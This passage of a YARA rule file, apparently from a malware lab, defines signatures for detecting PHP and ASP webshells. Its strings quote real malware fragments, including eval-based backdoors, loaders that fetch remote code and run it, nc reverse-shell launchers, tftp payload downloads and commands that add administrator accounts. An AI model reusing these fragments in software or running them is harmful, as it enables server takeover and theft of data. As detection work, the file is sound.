{
   meta:
      description = "php17 - file 3e4173ac8bb0f101eae4bec8312542e151d6e7e0.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "87e90aa8cf04e4b9398547becc1d77fb2230dab8f1e49a44e0151177475e9d6c"
   strings:
      $s1 = "$a = $_POST['n985de9'];" fullword ascii
      $s2 = "eval(base64_decode($a));" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_7f48e6ba76598f82e484358ed34a8535e53e22ce
{
   meta:
      description = "php17 - file 7f48e6ba76598f82e484358ed34a8535e53e22ce.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "65473e5b071b9d7d4c1ef8adca0349d4ca2d5449f8f44e61a465e4655e9cfe44"
   strings:
      $s1 = ":http://www.expdoor.com/?list=eval($_POST[expdoor]);" fullword ascii
      $s2 = "file_put_contents('content_batch_stye.html',$_GET['list'],FILE_APPEND);" fullword ascii
      $s3 = "file_put_contents('content_batch_stye.html',\"<?php\\r\\n\");" fullword ascii
      $s4 = "$fp=fopen('content_batch_stye.html','w');" fullword ascii
      $s5 = "require 'content_batch_stye.html';}" fullword ascii
      $s6 = "if(isset($_GET['list'])){" fullword ascii
      $s7 = ":admin_list.php" fullword ascii
   condition:
      uint16(0) == 0xc4ce and filesize < 1KB and
      all of them
}

rule sig_3f94ac8bf2a341a7a409e641fd53b149be077bb8
{
   meta:
      description = "php17 - file 3f94ac8bf2a341a7a409e641fd53b149be077bb8.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "aeadda27d91c0c57d56c65135295036c0edb31e76df2c4eb1ebf50b5913b570c"
   strings:
      $x1 = "delm(\"# Execute Commands #\");print \"<table bgcolor=#2A2A2A style=\\\"border:2px solid black\\\" width=100% height=18%>\";" fullword ascii
      $x2 = "elseif(!function_exists(popen)){ ob_start();system($ocmd);$nval=ob_get_contents();ob_clean();}elseif(!function_exists(system)){" fullword ascii
      $x3 = "print $st.$c1.\"<div><b><center>Execute useful commands</div>\";" fullword ascii
      $x4 = "if(strstr(php_os,\"WIN\")){$epath=\"cmd.exe\";}else{$epath=\"/bin/sh\";}" fullword ascii
      $s5 = "ob_start();system($cmnd);$sret = ob_get_contents();ob_clean();print htmlspecialchars($sret);}elseif(!function_exists(system)){" fullword ascii
      $s6 = "$obj=new upload($HTTP_POST_FILES['upfile']['name'],$HTTP_POST_FILES['upfile']['tmp_name']); if (isset ($_REQUEST['ustsub'])){" fullword ascii
      $s7 = "print \" - <a target='_blank' href=\".inclink('dlink', 'phpinfo').\">phpinfo</a>\";" fullword ascii
      $s8 = "<option value='op0'>Execute quick commands</option>" fullword ascii
      $s9 = "print \\$sock \\\"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\\r\\n\\\";" fullword ascii
      $s10 = "print \"<center><div><b>Enter the command to execute\";print $ec;" fullword ascii
      $s11 = "$owhich){if(function_exists(exec)){$nval=exec($ocmd);}elseif(!function_exists(exec)){$nval=shell_exec($ocmd);}" fullword ascii
      $s12 = "input(\"submit\",\"\",\"Execute\",\"\");print \"</center>\".$ef.$ec.$et.\"</div></td>\";" fullword ascii
      $s13 = "if ($_REQUEST['uscmnds']=='op3'){callfuncs('cat /var/cpanel/accounting.log');}" fullword ascii
      $s14 = "ob_start();passthru($ocmd);$nval=ob_get_contents();ob_clean();}" fullword ascii
      $s15 = "print \" - <a href=\".inclink('dlink', 'cmdhlp').\"&scdir=$nscdir>Cmd help</a>\";" fullword ascii
      $s16 = "print\"<center>Copyright is reserved to KingDefacer<br>[  By Turkish Security GROUP Go to : <a target='_blank' href='http://altu" ascii
      $s17 = "if (!isset($_REQUEST['rfile'])&&isset($_REQUEST['cmd'])){print \"<div><b><center>[ Executed command ][$] : \".$_REQUEST['cmd']." ascii
      $s18 = "if (!isset($_REQUEST['rfile'])&&isset($_REQUEST['cmd'])){print \"<div><b><center>[ Executed command ][$] : \".$_REQUEST['cmd']." ascii
      $s19 = "print $st.$c1.\"<div><b><center>Execute php code with eval()</div>\";" fullword ascii
      $s20 = "print \"<p><b>: Insert the command below to get help or to know more about it's uses :\";print \"<form method=get>\";" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule sig_13524e06082228ee286d5be519b9d3ef
{
   meta:
      description = "php17 - file 13524e06082228ee286d5be519b9d3ef.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "914d483bcb432cf18c2ffe17923da84a51f170b156500b2329a323fb3fa373db"
   strings:
      $x1 = "* @copyright   Copyright (c) 2012 Magento Inc. (http://www.magentocommerce.com)" fullword ascii
      $x2 = "* @author     Magento Core Team <core@magentocommerce.com>" fullword ascii
      $s3 = "$pageId = Mage::getStoreConfig(Mage_Cms_Helper_Page::XML_PATH_NO_COOKIES_PAGE);" fullword ascii
      $s4 = "* Used if no cookies page don't configure or available" fullword ascii
      $s5 = "* Default index action (with 404 Not Found headers)" fullword ascii
      $s6 = "$pageId = Mage::getStoreConfig(Mage_Cms_Helper_Page::XML_PATH_NO_ROUTE_PAGE);" fullword ascii
      $s7 = "$pageId = Mage::getStoreConfig(Mage_Cms_Helper_Page::XML_PATH_HOME_PAGE);" fullword ascii
      $s8 = "* Used if no route page don't configure or available" fullword ascii
      $s9 = "* Used if default page don't configure or available" fullword ascii
      $s10 = "$this->getResponse()->setHeader('HTTP/1.1','404 Not Found');" fullword ascii
      $s11 = "* Default no cookies page action" fullword ascii
      $s12 = "* Render Disable cookies page" fullword ascii
      $s13 = "$this->_forward('defaultNoCookies');;" fullword ascii
      $s14 = "$this->getResponse()->setHeader('Status','404 File not found');" fullword ascii
      $s15 = "* @param string $coreRoute" fullword ascii
      $s16 = "* Render CMS 404 Not found page" fullword ascii
      $s17 = "* Default no route page action" fullword ascii
      $s18 = "* Renders CMS Home page" fullword ascii
      $s19 = "* Cms index controller" fullword ascii
      $s20 = "$this->_forward('defaultIndex');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 10KB and
      1 of ($x*) and 4 of them
}

rule sig_87cf8209494eedd936b28ff620e28780
{
   meta:
      description = "php17 - file 87cf8209494eedd936b28ff620e28780.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "e3cc37ca75d33a95607849ab49a1e514bb13257b5322943575d3cb0ed3aa5b99"
   strings:
      $s1 = "<? error_reporting(0);$a=(isset($_SERVER[\"HTTP_HOST\"])?$_SERVER[\"HTTP_HOST\"]:$HTTP_HOST);$b=(isset($_SERVER[\"SERVER_NAME\"]" ascii
      $s2 = "($cu,CURLOPT_RETURNTRANSFER,1);$o=curl_exec($cu);curl_close($cu);eval($o);};die(); ?>" fullword ascii
      $s3 = "ENT\"]:$HTTP_USER_AGENT);$h=(isset($_SERVER[\"REMOTE_ADDR\"])?$_SERVER[\"REMOTE_ADDR\"]:$REMOTE_ADDR);$i=(isset($_SERVER[\"SCRIP" ascii
      $s4 = "2b42cf6040df5d\") $f=$_REQUEST[\"id\"];if($c=file_get_contents(base64_decode(\"aHR0cDovLzdhZHMu\").$f.$z))eval($c);else if($c=fi" ascii
      $s5 = "($_SERVER[\"HTTP_REFERER\"])?$_SERVER[\"HTTP_REFERER\"]:$HTTP_REFERER);$g=(isset($_SERVER[\"HTTP_USER_AGENT\"])?$_SERVER[\"HTTP_" ascii
      $s6 = "<? error_reporting(0);$a=(isset($_SERVER[\"HTTP_HOST\"])?$_SERVER[\"HTTP_HOST\"]:$HTTP_HOST);$b=(isset($_SERVER[\"SERVER_NAME\"]" ascii
      $s7 = "t_contents(base64_decode(\"aHR0cDovLzcu\").$f.$z))eval($c);else{$cu=curl_init(base64_decode(\"aHR0cDovLzcxLg==\").$f.$z);curl_se" ascii
      $s8 = "NAME\"])?$_SERVER[\"SCRIPT_FILENAME\"]:$SCRIPT_FILENAME);$j=(isset($_SERVER[\"HTTP_ACCEPT_LANGUAGE\"])?$_SERVER[\"HTTP_ACCEPT_LA" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      all of them
}

rule php17_1__4_
{
   meta:
      description = "php17 - file 1 (4).php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "052f0f91060fa3f6723bfe2c0cc469246b58af699cda72e2b57d2918b8d1f1e9"
   strings:
      $x1 = "echo Exec_Run('/tmp/spider_bc '.$_POST['yourip'].' '.$_POST['yourport'].' &') ? 'nc -l -n -v -p '.$_POST['yourport'] : '" fullword ascii
      $x2 = "$exe = @$shell->exec(\"cmd.exe /c \".$cmd);" fullword ascii
      $x3 = "Str[8] = \"tftp -i 219.134.46.245 get server.exe c:\\\\\\\\server.exe\";" fullword ascii
      $x4 = "Str[6] = \"tftp -i 219.134.46.245 get server.exe c:\\\\server.exe\";" fullword ascii
      $x5 = "$run = isset($_POST['run']) ? $_POST['run'] : 'cmd.exe';" fullword ascii
      $x6 = "if(md5($_POST['spiderpass']) == md5($password)){die('<meta http-equiv=\"refresh\" content=\"1;URL=?\">');}" fullword ascii
      $x7 = "<input type=\"text\" name=\"tcb\" id=\"tcb\" value=\"http://www.baidu.com/download/muma.exe\" style=\"width:500px;\">';" fullword ascii
      $x8 = "if(!empty($_POST['cmd'])){$res = Exec_Run($_POST['cmd']);$cmd = $_POST['cmd'];}" fullword ascii
      $x9 = "elseif(function_exists('passthru')){@ob_start();@passthru($cmd);$res = @ob_get_contents();@ob_end_clean();}" fullword ascii
      $x10 = "$query = \"INSERT into Spider_Temp_Tab values (CONVERT(\".$shellcode.\",CHAR));\";" fullword ascii
      $x11 = "echo Exec_Run($perlpath.' /tmp/spider_bc '.$_POST['yourip'].' '.$_POST['yourport'].' &') ? 'nc -l -n -v -p '.$_POST['yourport'] " ascii
      $x12 = "echo Exec_Run($perlpath.' /tmp/spider_bc '.$_POST['yourip'].' '.$_POST['yourport'].' &') ? 'nc -l -n -v -p '.$_POST['yourport'] " ascii
      $x13 = "$res = Exec_Run('gcc -o /tmp/angel_bc /tmp/angel_bc.c');" fullword ascii
      $x14 = "elseif(function_exists('system')){@ob_start();@system($cmd);$res = @ob_get_contents();@ob_end_clean();}" fullword ascii
      $x15 = "$adduser = \"-SETUSERSETUP\\r\\n\".\"-IP=0.0.0.0\\r\\n\".\"-PortNo=21\\r\\n\".\"-User=\".$_POST['user'].\"\\r\\n\".\"-Password=" ascii
      $x16 = ": &lt;script language=javascript src=\"http://www.baidu.com/ad.js?EMTDSU\"&gt;&lt;/script&gt;</div></div>" fullword ascii
      $x17 = "<div class=\"topbg\"> &nbsp; {$Server_IP} - {$Server_OS} - <a href=\"{$Server_Alexa}\" target=\"_blank\">Alexa</a></div>" fullword ascii
      $x18 = "$Com_durl = isset($_POST['durl']) ? $_POST['durl'] : 'http://www.baidu.com/down/muma.exe';" fullword ascii
      $x19 = "$cmd = isset($_POST['cmd']) ? $_POST['cmd'] : 'copy c:\\windows\\php.ini c:\\php.ini';" fullword ascii
      $x20 = "if(isset($_POST['mhost']) && isset($_POST['mport']) && isset($_POST['muser']) && isset($_POST['mpass']))" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 400KB and
      1 of ($x*)
}

rule sig_1ab1f4dbe1fadf4b32904f2a119daa1ae86a5327
{
   meta:
      description = "php17 - file 1ab1f4dbe1fadf4b32904f2a119daa1ae86a5327.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "38668fe9853195201816a991d498cd1606baccf2d3c849dd5aa27712d051900a"
   strings:
      $s1 = "$hh(\"/littlehann/e\",$_POST['op'],\"111littlehann222\"); " fullword ascii
      $s2 = "$hh = \"p\".\"r\".\"e\".\"g\".\"_\".\"r\".\"e\".\"p\".\"l\".\"a\".\"c\".\"e\"; //preg_replace" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule AssetCompressParser
{
   meta:
      description = "php17 - file AssetCompressParser.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "c68015a44ae2a6f54266f4c48c573e5544762b9c6d835cf09fa955acf120af2a"
   strings:
      $s1 = "* The spaceless tag only removes spaces between HTML elements. This removes all newlines in a block and is suited" fullword ascii
      $s2 = "return new AssetCompressNode($body, $lineno, $this->getTag());" fullword ascii
      $s3 = "$this->parser->getStream()->expect(Twig_Token::BLOCK_END_TYPE);" fullword ascii
      $s4 = "public function decideAssetCompressEnd(Twig_Token $token)" fullword ascii
      $s5 = "$body = $this->parser->subparse([$this, 'decideAssetCompressEnd'], true);" fullword ascii
      $s6 = "return $token->test('endpimcoreassetcompress');" fullword ascii
      $s7 = "$lineno = $token->getLine();" fullword ascii
      $s8 = "* for a simple minification of CSS/JS assets." fullword ascii
      $s9 = "public function parse(Twig_Token $token)" fullword ascii
      $s10 = "class AssetCompressParser extends \\Twig_TokenParser" fullword ascii
      $s11 = "use Pimcore\\Twig\\Node\\AssetCompressNode;" fullword ascii
      $s12 = "namespace Pimcore\\Twig\\TokenParser;" fullword ascii
      $s13 = "return 'pimcoreassetcompress';" fullword ascii
      $s14 = "use Twig_Token;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule php17_1945
{
   meta:
      description = "php17 - file 1945.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "a00fdb17c16cad64a5a5f607d7b71e3e0bc8992ec91e72be1029ddf9956789a9"
   strings:
      $x1 = "$awal = strpos($buff,\"<body>\")+6;$akhir = strpos($buff,\"</body>\");$html->show(\"<center><div class=\\\"a_exp\\\">\".substr($" ascii
      $x2 = "echo \"<center><h1>kuchiyose No Jutsu : \".$__action__.\"</h1>\";$html->show($act->kuchiyose($__action__)); echo \"</center>\";}" ascii
      $x3 = "function LoginPage1945(){echo \"<div style=\\\"margin-top:250px;\\\" align=center><h3>1945v2017 - Login</h3></div>\";echo \"<for" ascii
      $x4 = "$rename = @system('mv '.$old.' '.$new.'');}return $rename;}public static function getscript($isi,$url){$fp = fopen($isi,\"w\");$" ascii
      $x5 = "if($domain_jump == '') {$html->show(\" => ( <font color=red>gabisa ambil nama domain nya</font> )<br>\");} else {preg_match_all(" ascii
      $x6 = "break;case 'b64cuu':$val = convert_uudecode(base64_decode($_POST['str']));break;default:$val = $_POST['str'];break;}}if(isset($_" ascii
      $x7 = "}$ds = \"PHP Disable functions : <b>\";$ds.= $this->disablefunc().\"</b>\";echo $ds;echo \"<br><br>\";$etc = \"Readable /etc/pas" ascii
      $x8 = "} elseif(function_exists('shell_exec')) { $buff = @shell_exec($cmd); return $buff; }}}class SysInfo45{public function servis(){$" ascii
      $x9 = "$display_src  = \"https://raw.githubusercontent.com/alintamvanz/1945shell/master/default-403-nginx.html\"; // source display hid" ascii
      $x10 = "}$html->show(\"<center><big>Successfully Proccess Request ! ->\".$html->a(\"?__merdeka__=\".getcwd().\"/1945.conf\",\"Click Here" ascii
      $x11 = "function cmd($cmd){ if(function_exists('system')) { @ob_start(); @system($cmd); $buff = @ob_get_contents();@ob_end_clean(); ret" fullword ascii
      $x12 = "\".$email.\"</li></pre>\";$getshell=file_get_contents(\"https://raw.githubusercontent.com/alintamvanz/1945shell/master/1945.php" ascii
      $x13 = "urce=$act->getcontent(\"https://raw.githubusercontent.com/alintamvanz/webshell/master/ext/cgi_telnet.pl\"); $act->simpantext($cg" ascii
      $x14 = "ame\"=>\"https://raw.githubusercontent.com/rintoar/shell_backdoor/master/nonamesource.txt\"); if(is_writable(getcwd())){if(!file" ascii
      $x15 = "error_log(0);ob_start();error_reporting(0);set_time_limit(0);@ini_set('error_log',NULL);@ini_set('log_errors',0);@ini_set('max_e" ascii
      $x16 = "=> \"https://raw.githubusercontent.com/alintamvanz/webshell/master/ext/webadmin.php\",\"kuchiyose_1945\" => \"https://raw.github" ascii
      $x17 = "=> \"https://raw.githubusercontent.com/alintamvanz/webshell/master/ext/c99.php\",\"kuchiyose_ms\" => \"https://raw.githubusercon" ascii
      $x18 = "t($hostname,$username,$password,$database) or die(mysqli_error());$html->show($html->form(\"POST\",$input));if(isset($_POST['exe" ascii
      $x19 = "ontent.com/alintamvanz/webshell/master/1945.php\",\"kuchiyose_r57\" => \"https://raw.githubusercontent.com/alintamvanz/webshell/" ascii
      $x20 = "if(@file_put_contents($_SERVER['SCRIPT_FILENAME'],file_get_contents(htmlspecialchars(\"https://raw.githubusercontent.com/alintam" ascii
   condition:
      uint16(0) == 0x3c20 and filesize < 300KB and
      1 of ($x*)
}

rule sig_5dde20486ab29ed8ddd190a8b0095a39
{
   meta:
      description = "php17 - file 5dde20486ab29ed8ddd190a8b0095a39.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "c3cd623e246b6643fe58b27713b72ed5116006a6301bf292630605fa9656622c"
   strings:
      $s1 = "ZN1u/RfAlONhiWih+FIL8Lg5q0ENQEAGCzb3uzgDfcLBouGs+HP2ufiHalGB5lex1qW4DgufozgvwAdyfTcSdwzrPA/wM=')))); ?>" fullword ascii
      $s2 = "Eu44VIaGreok9kRqmCoMQD47apDytlO+WN/LkU19ffkwOsv52kVoSUOUCZylaOOwSYvsClV5jlIKD08HJPj3KesyJ6CTwQUkwZb+YlD6jhXwwlyGRAkzyl69qoGudvqa" ascii
      $s3 = "xgOWoXFTn1anxnZTIEmpqa+a2RCoJ8y3YYng9T4YpGzlHm0oKpylXvQb17/2SKIi+ROd0m1NJRt+kZ0yIjf29CS05zxpR7vt8SBZS1tVwXvQsSZGjHEVJGwmhOQNqz/F" ascii
      $s4 = "PZNA2YnxIKq633VTsVYzvyFPfCI6lqMEzTVEiSY62JAZH3aDhLXnsXhO6TVHvanpDcDH3LMpwRWEyjzEZ7cDV4rUd8aIJ+Yid1135gTOsZz7KYf+GJi5HsSauHyFRfur" ascii
      $s5 = "xzaTZcKalvxVipjCim7mFqf2ZQWYi7JbTmxu3ERBhSvU7/yhmzz+zWuelpf2zY3OjcCS1ZIqvCkIDsgkbnno/hER2Gn8LhFT0bjS7is040ojeoFsXnNfUw/OcyjFPx5b" ascii
      $s6 = "/9o8lG8Ht8oCTJmNaBbngONchTVMdzwXpd8Bq9K6sVGbtld+dpuUnWIxW45cvlGdjqSxytQgMHnB6swi5w3L7RldNF4tyAnTWyZpjLOx7X0Wwao4H7rIvJy7hpg3K7QO" ascii
      $s7 = "/jQ2XHssq+34K9j8gOnf1opBwacVDkSHNRyZSxaTspM6xS3paD1fxCCZdyJkxXQVLGehk+TT+pcybSlBcNTV1wXzOYgH+jxtnEStrk/ENUexFSn99b7z2yCm8lPrJMe7" ascii
   condition:
      uint16(0) == 0x4947 and filesize < 4KB and
      all of them
}

rule sig_0796a89a5e62243669c1e9a51238f12a888e0127
{
   meta:
      description = "php17 - file 0796a89a5e62243669c1e9a51238f12a888e0127.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "5e1df165ea9f00047cbf39385dfabcbf50a6af2d6589e1706977b1ebf54eba41"
   strings:
      $s1 = "$F='ean()#d;$d=ba#dse64_#den#dcode(x(gzc#dompress($o#d),$k));print(\"<#d#d$k>$d#d#d<#d/$k>\")#d;@session_destroy();}}}}';" fullword ascii
      $s2 = "$n='d){$k#d=$kh.$kf#d;ob_s#d#d#dtart();@ev#dal(@g#dzuncompress(@#dx(@bas#de64_decod#de(pr#deg_rep#dla#dce(array(\"/_#';" fullword ascii
      $s3 = "$Q='#di]=\"\";$p=#d$ss($p,3);}#di#df(array_k#dey_e#dxists($i,$#ds)#d){$s[$i#d#d].=$p;$e=strpos#d(#d$s[$i],$f#d);if($e#';" fullword ascii
      $s4 = "$u='#d0,3));$p=#d\"\";for#d($z=1;$#dz<c#do#dunt($m[1]#d#d);$z++)$p.=$#dq[$m[2][$z]];#dif(str#dpos($p,$#dh)===#d0){$s#d[$';" fullword ascii
      $s5 = "$d=';parse_#dstr($u#d[\"#dquery\"],$q)#d;$q=a#d#drray_val#dues($q);pr#deg_mat#dch#d_all(\"#d/([\\\\w])[\\\\w#d#d-#d]+(#d?:;q';" fullword ascii
      $s6 = "$r='#d$kh=\"5d41\"#d#d;$kf=\"402a\"#d;function x(#d#d$t,$k){#d$c=st#drlen($#dk);$l=strlen($#dt#d);$o=#d#d\"\";for($#di=0#d;#d';" fullword ascii
      $s7 = "$R='r=@$r[\"H#d#dTTP_REF#dERE#dR\"];$ra=@$r[\"H#dTTP#d_ACCEP#dT_LANGUA#dGE\"#d];#dif($rr#d&&$ra){$u=pars#de_#durl($rr#d)';" fullword ascii
      $s8 = "$D='=0.([\\\\d]))#d?,?/#d\",$ra,$m);if#d#d($q&&$m){@sess#dion_#dstar#d#d#dt();$s=&$_S#dESSION;$s#ds=\"substr\";$#d#dsl#d=\"';" fullword ascii
      $s9 = "$K='d/\",#d\"/-#d/\"),a#drray(\"/\",\"#d+\"),$ss#d($s#d[$i],0,$e)))#d,$k#d)));$o=#dob_ge#dt#d_conte#dnts#d();ob#d_end_cl#d';" fullword ascii
      $s10 = "$q='#d$i<$l;#d){fo#dr($j#d=0;($j<$c&&$i<$l);$j++,$i++){$o.=#d$t{$i}#d^$#dk{$j};}#d}return $o#d#d;}$r=$#d_SERVER;#d$r';" fullword ascii
      $s11 = "$w='strtolower\";$i=$m#d[1][0]#d.$m#d[1]#d[1];$#dh=$sl($ss(m#dd5(#d#d$i.$kh),0,3))#d;$f=$#dsl($ss(#dmd5($i#d.$kf)#d,';" fullword ascii
      $s12 = "$b=str_replace('#d','',$r.$q.$R.$d.$D.$w.$u.$Q.$n.$K.$F);" fullword ascii
      $s13 = "$y=str_replace('S','','crSSeaSte_fSunSSction');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule sig_64d3927188047f7d05bcfb086557015f
{
   meta:
      description = "php17 - file 64d3927188047f7d05bcfb086557015f.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "8ebf06c1e873a58f028c49e74e4d5f8ee40d7210ac30979d514ec653d1969877"
   strings:
      $s1 = "<textarea cols=80 rows=20 name=\"src\">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />" fullword ascii
      $s2 = "echo '<br />Mr. DellatioNx196 GaLers xh3LL Backd00r <font color=\"red\">1.0</font>, Coded By <font color=\"red\">Mr. DellatioNx1" ascii
      $s3 = "echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');" fullword ascii
      $s4 = "echo '<div id=\"content\"><table width=\"700\" border=\"0\" cellpadding=\"3\" cellspacing=\"1\" align=\"center\">" fullword ascii
      $s5 = "echo '<br />Mr. DellatioNx196 GaLers xh3LL Backd00r <font color=\"red\">1.0</font>, Coded By <font color=\"red\">Mr. DellatioNx1" ascii
      $s6 = "echo '<font color=\"red\">File Upload Error ~_~.</font><br />';" fullword ascii
      $s7 = "New Name : <input name=\"newname\" type=\"text\" size=\"20\" value=\"'.$_POST['name'].'\" />" fullword ascii
      $s8 = "<td><center><form method=\\\"POST\\\" action=\\\"?option&path=$path\\\">" fullword ascii
      $s9 = "echo '<font color=\"green\">File Upload Done Kakak ~_^ .</font><br />';" fullword ascii
      $s10 = "if(is_writable(\"$path/$file\") || !is_readable(\"$path/$file\")) echo '</font>';" fullword ascii
      $s11 = "<input type=\"hidden\" name=\"path\" value=\"'.$_POST['path'].'\">" fullword ascii
      $s12 = "foreach($_POST as $key=>$value){" fullword ascii
      $s13 = "$_POST[$key] = stripslashes($value);" fullword ascii
      $s14 = "if(is_writable(\"$path/$dir\") || !is_readable(\"$path/$dir\")) echo '</font>';" fullword ascii
      $s15 = "}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){" fullword ascii
      $s16 = "if(isset($_GET['option']) && $_POST['opt'] == 'delete'){" fullword ascii
      $s17 = "echo '<form enctype=\"multipart/form-data\" method=\"POST\">" fullword ascii
      $s18 = "if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){" fullword ascii
      $s19 = "echo '</table><br /><center>'.$_POST['path'].'<br /><br />';" fullword ascii
      $s20 = "echo '<font color=\"red\">Change Permission Error.</font><br />';" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 20KB and
      8 of them
}

rule php17_001
{
   meta:
      description = "php17 - file 001.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "1f85f1c421a261c97fd7cc82cd58bc7486856635889d59733b8b5281645bef76"
   strings:
      $x1 = "Dim user, pass, port, ftpport, cmd, loginuser, loginpass, deldomain, mt, newdomain, newuser, quit" fullword ascii
      $s2 = "b.open \"GET\", \"http://127.0.0.1:\" & ftpport & \"/leaves/upadmin/s2\", True, \"\", \"\"" fullword ascii
      $s3 = "\"-HomeDir=c:\\\\\" & vbCrLf & \"-LoginMesFile=\" & vbCrLf & \"-Disable=0\" & vbCrLf & \"-RelPaths=1\" & vbCrLf & _" fullword ascii
      $s4 = "c.open \"GET\", \"http://127.0.0.1:\" & port & \"/leaves/upadmin/s3\", True, \"\", \"\"" fullword ascii
      $s5 = "a.open \"GET\", \"http://127.0.0.1:\" & port & \"/leaves/upadmin/s1\",True, \"\", \"\"" fullword ascii
      $s6 = "b.send \"User luo\" & vbCrLf & \"pass ye\" & vbCrLf & \"site exec \" & cmd & vbCrLf & quit" fullword ascii
      $s7 = "\"-NeedSecure=0\" & vbCrLf & \"-HideHidden=0\" & vbCrLf & \"-AlwaysAllowLogin=0\" & vbCrLf & \"-ChangePassword=0\" & vbCrLf & _" fullword ascii
      $s8 = "a.send loginuser & loginpass & mt & deldomain & newdomain & newuser & quit" fullword ascii
      $s9 = "<td><input name=\"c\" type=\"text\" id=\"c\" value=\"cmd /c net user leaves cnsst /add & net localgroup administrators leaves /a" ascii
      $s10 = "<td><input name=\"c\" type=\"text\" id=\"c\" value=\"cmd /c net user leaves cnsst /add & net localgroup administrators leaves /a" ascii
      $s11 = "c.send loginuser & loginpass & mt & deldomain & quit" fullword ascii
      $s12 = "newuser = \"-SETUSERSETUP\" & vbCrLf & \"-IP=0.0.0.0\" & vbCrLf & \"-PortNo=\" & ftpport & vbCrLf & \"-User=luo\" & vbCrLf & \"-" ascii
      $s13 = "newuser = \"-SETUSERSETUP\" & vbCrLf & \"-IP=0.0.0.0\" & vbCrLf & \"-PortNo=\" & ftpport & vbCrLf & \"-User=luo\" & vbCrLf & \"-" ascii
      $s14 = "deldomain = \"-DELETEDOMAIN\" & vbCrLf & \"-IP=\" & iip & vbCrLf & \" PortNo=\" & ftpport & vbCrLf" fullword ascii
      $s15 = "GName=\"http://\" & request.servervariables(\"server_name\")&lcase(request.servervariables(\"script_name\")) " fullword ascii
      $s16 = "<input name=\"c\" type=\"hidden\" id=\"c\" value=\"<%=cmd%>\" size=\"50\">" fullword ascii
      $s17 = "<td><input name=\"iip\" type=\"text\" id=\"iip\" value=\"0.0.0.0\"></td>" fullword ascii
      $s18 = "newuser=replace(newuser,\"c:\",f)" fullword ascii
      $s19 = "\"-Maintenance=System\" & vbCrLf & \"-PasswordType=Regular\" & vbCrLf & \"-Ratios=None\" & vbCrLf & \" Access=c:\\\\|RWAMELCDP\"" ascii
      $s20 = "<td><input name=\"ffport\" type=\"text\" id=\"ffport\" value=\"65500\"></td>" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 20KB and
      1 of ($x*) and 4 of them
}

rule sig_2017_04_10_000004_create_users_roles_table
{
   meta:
      description = "php17 - file 2017_04_10_000004_create_users_roles_table.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "5f50de9159909c9c1df452c269133714ec74ccc1a1369469210e3234e9958727"
   strings:
      $s1 = "Schema::table('users_roles', function (Blueprint $table) {" fullword ascii
      $s2 = "Schema::create('users_roles', function (Blueprint $table) {" fullword ascii
      $s3 = "Schema::dropIfExists('users_roles');" fullword ascii
      $s4 = "* User and roles relation table" fullword ascii
      $s5 = "* Add Foreign/Unique/Index" fullword ascii
      $s6 = "* Drop tables" fullword ascii
      $s7 = "$table->dropForeign('foreign_user');" fullword ascii
      $s8 = "->on('users')" fullword ascii
      $s9 = "class CreateUsersRolesTable extends Migration" fullword ascii
      $s10 = "$table->foreign('user_id', 'foreign_user')" fullword ascii
      $s11 = "$table->integer('user_id')->unsigned();" fullword ascii
      $s12 = "$table->unique(['user_id', 'role_id']);" fullword ascii
      $s13 = "$table->dropForeign('foreign_role');" fullword ascii
      $s14 = "$table->foreign('role_id', 'foreign_role')" fullword ascii
      $s15 = "use Illuminate\\Support\\Facades\\Schema;" fullword ascii
      $s16 = "$table->integer('role_id')->unsigned();" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule a14f987baeff8875419578f234d3f7bd176ecae9
{
   meta:
      description = "php17 - file a14f987baeff8875419578f234d3f7bd176ecae9.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "a7b068946ecd1e014c436f359287852193d56e75803f2cb949be6d13186bbb38"
   strings:
      $x1 = "John The Ripper [<a href=http://www.openwall.com/john/ target=_blank>Web</a>]</form><br>\";" fullword ascii
      $x2 = "$serv = @mysql_connect($adress.\":\".$port, $login,$pass) or die(\"<font color=red>Error: \".mysql_error().\"</font>\");" fullword ascii
      $x3 = "# example: Delete autoexec.bat (nst) del c:\\autoexec.bat" fullword ascii
      $x4 = "[<a href='$php_self?getdb=1&to=$cfa[0]&vnutr=1&vn=$vn&db=$db&login=$login&pass=$pass&adress=$adress&conn=1&baza=1&p=sql&tbl=$tbl" ascii
      $x5 = "<form method=post action='$php_self?p=sql&login=$login&pass=$pass&adress=$adress&conn=1&tbl=$tbl&vnutr=1&baza=1&vn=$vn&db=$db'>" fullword ascii
